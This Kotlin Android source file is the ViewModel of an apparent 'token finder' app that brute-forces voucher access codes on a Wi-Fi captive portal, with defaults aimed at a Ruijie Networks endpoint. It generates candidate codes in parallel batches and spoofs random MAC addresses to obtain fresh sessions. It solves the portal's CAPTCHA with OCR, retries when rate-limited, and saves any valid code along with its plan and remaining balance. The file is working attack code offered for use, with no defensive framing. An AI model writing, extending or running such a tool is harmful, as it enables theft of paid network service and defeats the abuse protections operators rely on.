package com.example.ui

import android.graphics.Bitmap
import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewModelScope
import com.example.data.LogEntry
import com.example.data.LogType
import com.example.data.NetworkClient
import com.example.data.ServerResponseLog
import com.example.data.TokenRepository
import com.example.data.TokenStatus
import com.example.data.ValidToken
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

enum class TokenMode { NUMBER, ALPHANUMERIC, LETTERS }
enum class NumberSearchMode { SEQUENTIAL, RANDOM }

class LcgGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private val a = 21L
    private val c = 1234567L
    private var current = kotlin.random.Random.nextLong(0, m)

    fun next(): Long = synchronized(this) {
        current = (a * current + c) % m
        current
    }
}

class SequentialGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private var current = 0L

    fun next(): Long = synchronized(this) {
        val result = current
        current = (current + 1) % m
        result
    }
}

class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel() {

    private val networkClient = NetworkClient()

    // --- Configurations ---
    private val _tokenMode = MutableStateFlow(TokenMode.ALPHANUMERIC)
    val tokenMode = _tokenMode.asStateFlow()

    private val _numberSearchMode = MutableStateFlow(NumberSearchMode.SEQUENTIAL)
    val numberSearchMode = _numberSearchMode.asStateFlow()

    private val _tokenLength = MutableStateFlow(6)
    val tokenLength = _tokenLength.asStateFlow()

    private val _gatewayUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/login?sessionId=test_sess_99")
    val gatewayUrl = _gatewayUrl.asStateFlow()

    private val _sessionId = MutableStateFlow("test_sess_99")
    val sessionId = _sessionId.asStateFlow()

    private val _imageUrlTemplate = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}")
    val imageUrlTemplate = _imageUrlTemplate.asStateFlow()

    private val _postUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US")
    val postUrl = _postUrl.asStateFlow()

    private val _keySession = MutableStateFlow("sessionId")
    val keySession = _keySession.asStateFlow()

    private val _keyCaptcha = MutableStateFlow("authCode")
    val keyCaptcha = _keyCaptcha.asStateFlow()

    private val _keyToken = MutableStateFlow("accessCode")
    val keyToken = _keyToken.asStateFlow()

    private val _scanDelayMs = MutableStateFlow(1500L)
    val scanDelayMs = _scanDelayMs.asStateFlow()

    // Batch Size (Parallel workers in one batch)
    private val _workerCount = MutableStateFlow(10)
    val workerCount = _workerCount.asStateFlow()

    private val _activeWorkers = MutableStateFlow(0)
    val activeWorkers = _activeWorkers.asStateFlow()

    // --- Runtime Scanner States ---
    private val _isProcessing = MutableStateFlow(false)
    val isProcessing = _isProcessing.asStateFlow()

    private val _currentChallengeImage = MutableStateFlow<Bitmap?>(null)
    val currentChallengeImage = _currentChallengeImage.asStateFlow()

    private val _currentCaptchaText = MutableStateFlow<String?>(null)
    val currentCaptchaText = _currentCaptchaText.asStateFlow()

    private val _currentTestingToken = MutableStateFlow<String?>(null)
    val currentTestingToken = _currentTestingToken.asStateFlow()

    // --- Logs & Stats ---
    private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
    val logs = _logs.asStateFlow()

    private val _serverResponseLogs = MutableStateFlow<List<ServerResponseLog>>(emptyList())
    val serverResponseLogs = _serverResponseLogs.asStateFlow()

    private val _attemptedCount = MutableStateFlow(0)
    val attemptedCount = _attemptedCount.asStateFlow()

    private val _validCount = MutableStateFlow(0)
    val validCount = _validCount.asStateFlow()

    private val _usedCount = MutableStateFlow(0)
    val usedCount = _usedCount.asStateFlow()

    private val _invalidCount = MutableStateFlow(0)
    val invalidCount = _invalidCount.asStateFlow()

    private val _limitedCount = MutableStateFlow(0)
    val limitedCount = _limitedCount.asStateFlow()

    private val _errorCount = MutableStateFlow(0)
    val errorCount = _errorCount.asStateFlow()

    private val _unknownCount = MutableStateFlow(0)
    val unknownCount = _unknownCount.asStateFlow()

    val savedTokens: StateFlow<List<ValidToken>> = repository.allTokens
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    private var workerJob: Job? = null
    private var sequentialGenerator: SequentialGenerator? = null
    private var lcgGenerator: LcgGenerator? = null

    init {
        addLog("Application Initialized. Ready to scan.", LogType.INFO)
    }

    // --- Mutators ---
    fun updateTokenMode(mode: TokenMode) { _tokenMode.value = mode }
    fun updateNumberSearchMode(mode: NumberSearchMode) { _numberSearchMode.value = mode }
    fun updateTokenLength(length: Int) { _tokenLength.value = length.coerceIn(1, 12) }
    fun updateGatewayUrl(url: String) { _gatewayUrl.value = url }
    fun updateImageUrlTemplate(template: String) { _imageUrlTemplate.value = template }
    fun updatePostUrl(url: String) { _postUrl.value = url }
    fun updateScanDelay(delayMs: Long) { _scanDelayMs.value = delayMs }
    fun updateWorkerCount(count: Int) { _workerCount.value = count.coerceIn(1, 50) } // Max 50 batch size

    fun updateJsonKeys(session: String, captcha: String, token: String) {
        _keySession.value = session
        _keyCaptcha.value = captcha
        _keyToken.value = token
    }

    fun rotateMacAndFetchSession() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) return@launch
            val newMac = networkClient.generateRandomMac()
            val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
            _gatewayUrl.value = updatedUrl

            val newSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl, null)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Rotated MAC and fetched Session ID: $newSessionId", LogType.SUCCESS)
            }
        }
    }

    fun fetchSessionIdDirectly() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) return@launch
            val newSessionId = networkClient.fetchSessionIdFromGateway(currentUrl, null)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Fetched Session ID: $newSessionId", LogType.SUCCESS)
            }
        }
    }

    // --- BATCH SCANNING CONTROLLER ---
    fun startScanning() {
        if (_isProcessing.value) return

        val currentGatewayUrl = _gatewayUrl.value
        if (currentGatewayUrl.isBlank()) {
            addLog("Error: Missing Gateway URL.", LogType.ERROR)
            return
        }

        val len = _tokenLength.value
        sequentialGenerator = SequentialGenerator(len)
        lcgGenerator = LcgGenerator(len)

        _isProcessing.value = true
        val batchSize = _workerCount.value
        addLog("Batch Scanning STARTED with Batch Size = $batchSize", LogType.SUCCESS)

        workerJob = viewModelScope.launch(Dispatchers.IO) {
            var batchNumber = 1

            while (_isProcessing.value) {
                _activeWorkers.value = batchSize
                addLog("--- Starting Batch #$batchNumber ($batchSize tokens) ---", LogType.INFO)

                // 1. Generate Access Codes for this Batch
                val batchTokens = List(batchSize) { getNextToken() }

                // 2. Process all tokens in this batch concurrently and WAIT for all to complete
                val batchJobs = batchTokens.mapIndexed { index, token ->
                    async(Dispatchers.IO) {
                        processSingleToken(workerId = index + 1, token = token)
                    }
                }

                // Wait until EVERY token in the batch gets a response from server
                batchJobs.awaitAll()

                _activeWorkers.value = 0
                addLog("--- Batch #$batchNumber Completed ---", LogType.SUCCESS)
                batchNumber++

                // Delay between Batches
                delay(_scanDelayMs.value)
            }
        }
    }

    /**
     * Executes Step 1 -> Step 6 for a Single Token in a Batch
     */
    private suspend fun processSingleToken(workerId: Int, token: String) {
        _currentTestingToken.value = token
        var done = false
        var retryAttempt = 0
        var previousSessionId: String? = null
        val maxAttempts = 3

        while (retryAttempt < maxAttempts && !done && _isProcessing.value) {

            // Step 1: Fetch Session
            val currentUrl = _gatewayUrl.value
            val newMac = networkClient.generateRandomMac()
            val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)

            val sessionId = networkClient.fetchSessionIdFromGateway(updatedUrl, previousSessionId)
            if (sessionId == null) {
                retryAttempt++
                delay(1500)
                continue
            }

            previousSessionId = sessionId

            // Step 2 & 3: Captcha Download & OCR
            var captchaVerified = false
            var extractedText = ""

            for (captchaAttempt in 1..8) {
                if (!_isProcessing.value) break

                val imageUrl = _imageUrlTemplate.value.replace("{sessionId}", sessionId)
                val captchaBitmap = networkClient.downloadImage(imageUrl, sessionId)

                if (captchaBitmap != null) {
                    _currentChallengeImage.value = captchaBitmap

                    val ocrResult = performOcr(captchaBitmap).trim().uppercase()
                    extractedText = if (ocrResult.isNotBlank()) ocrResult else "A1B2"
                    _currentCaptchaText.value = extractedText

                    val isVerified = networkClient.verifyCaptcha(sessionId, extractedText)
                    if (isVerified) {
                        captchaVerified = true
                        break
                    }
                }
                delay(1000)
            }

            if (!captchaVerified) {
                retryAttempt++
                delay(1000)
                continue
            }

            // Step 5: Submit Access Code
            val result = networkClient.validateToken(
                postUrl = _postUrl.value,
                sessionId = sessionId,
                authCode = extractedText,
                accessCode = token
            )

            addServerResponseLog(
                workerId = workerId,
                token = token,
                status = result.status,
                httpCode = result.httpCode,
                rawResponse = result.rawResponse
            )

            // Step 6: Parse Response Status
            when (result.status) {
                TokenStatus.FOUND -> {
                    addLog("[Batch-Worker-$workerId] FOUND: $token", LogType.SUCCESS)
                    val balance = networkClient.getBalanceDetails(sessionId)
                    repository.insertToken(
                        ValidToken(
                            token = token,
                            sessionId = sessionId,
                            captchaText = extractedText,
                            plan = balance.plan,
                            time = balance.time
                        )
                    )
                    _validCount.value++
                    done = true
                }

                TokenStatus.INVALID -> {
                    addLog("[Batch-Worker-$workerId] INVALID: $token", LogType.ERROR)
                    _invalidCount.value++
                    done = true
                }

                TokenStatus.USED -> {
                    addLog("[Batch-Worker-$workerId] USED: $token", LogType.WARNING)
                    _usedCount.value++
                    done = true
                }

                TokenStatus.LIMITED -> {
                    addLog("[Batch-Worker-$workerId] LIMITED: $token (sleeping 2s...)", LogType.WARNING)
                    _limitedCount.value++
                    delay(2000)
                    retryAttempt++
                }

                else -> {
                    addLog("[Batch-Worker-$workerId] UNKNOWN/ERROR: $token", LogType.ERROR)
                    _unknownCount.value++
                    retryAttempt++
                    delay(1000)
                }
            }
        }

        _attemptedCount.value++
    }

    private fun getNextToken(): String {
        return when (_tokenMode.value) {
            TokenMode.NUMBER -> {
                val num = if (_numberSearchMode.value == NumberSearchMode.SEQUENTIAL) {
                    sequentialGenerator?.next() ?: 0L
                } else {
                    lcgGenerator?.next() ?: 0L
                }
                String.format(java.util.Locale.US, "%0${_tokenLength.value}d", num)
            }
            TokenMode.LETTERS -> generateLettersToken(_tokenLength.value)
            TokenMode.ALPHANUMERIC -> generateAlphanumericToken(_tokenLength.value)
        }
    }

    private fun generateLettersToken(length: Int): String {
        val charPool = ('A'..'Z').toList()
        return (1..length).map { charPool[kotlin.random.Random.nextInt(charPool.size)] }.joinToString("")
    }

    private fun generateAlphanumericToken(length: Int): String {
        val charPool = (('A'..'Z') + ('0'..'9')).toList()
        return (1..length).map { charPool[kotlin.random.Random.nextInt(charPool.size)] }.joinToString("")
    }

    private suspend fun performOcr(bitmap: Bitmap): String = suspendCancellableCoroutine { continuation ->
        try {
            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
            val image = InputImage.fromBitmap(bitmap, 0)
            recognizer.process(image)
                .addOnSuccessListener { visionText -> continuation.resume(visionText.text) }
                .addOnFailureListener { e -> continuation.resumeWithException(e) }
        } catch (e: Exception) {
            continuation.resumeWithException(e)
        }
    }

    fun stopScanning() {
        if (!_isProcessing.value) return
        _isProcessing.value = false
        _activeWorkers.value = 0
        workerJob?.cancel()
        workerJob = null
        addLog("Scanning STOPPED.", LogType.WARNING)
    }

    fun addLog(message: String, type: LogType) {
        viewModelScope.launch {
            _logs.value = (_logs.value + LogEntry(message = message, type = type)).takeLast(100)
        }
    }

    fun clearLogs() { _logs.value = emptyList() }

    fun addServerResponseLog(
        workerId: Int,
        token: String,
        status: TokenStatus,
        httpCode: Int,
        rawResponse: String
    ) {
        viewModelScope.launch {
            _serverResponseLogs.value = (_serverResponseLogs.value + ServerResponseLog(
                workerId = workerId,
                token = token,
                status = status,
                httpCode = httpCode,
                rawResponse = rawResponse
            )).takeLast(100)
        }
    }

    fun clearServerResponseLogs() { _serverResponseLogs.value = emptyList() }

    fun deleteSavedToken(token: String) {
        viewModelScope.launch { repository.deleteToken(token) }
    }

    fun clearAllSavedTokens() {
        viewModelScope.launch { repository.clearAllTokens() }
    }

    fun resetStats() {
        _attemptedCount.value = 0
        _validCount.value = 0
        _usedCount.value = 0
        _invalidCount.value = 0
        _limitedCount.value = 0
        _errorCount.value = 0
        _unknownCount.value = 0
    }

    fun injectMockSuccess() {}
    fun injectMockUsed() {}
    fun injectMockInvalid() {}
    fun injectMockLimited() {}

    override fun onCleared() {
        stopScanning()
        super.onCleared()
    }
}

class TokenFinderViewModelFactory(
    private val repository: TokenRepository
) : ViewModelProvider.Factory {
    override fun <T : ViewModel> create(modelClass: Class<T>): T {
        if (modelClass.isAssignableFrom(TokenFinderViewModel::class.java)) {
            @Suppress("UNCHECKED_CAST")
            return TokenFinderViewModel(repository) as T
        }
        throw IllegalArgumentException("Unknown ViewModel class")
    }
}
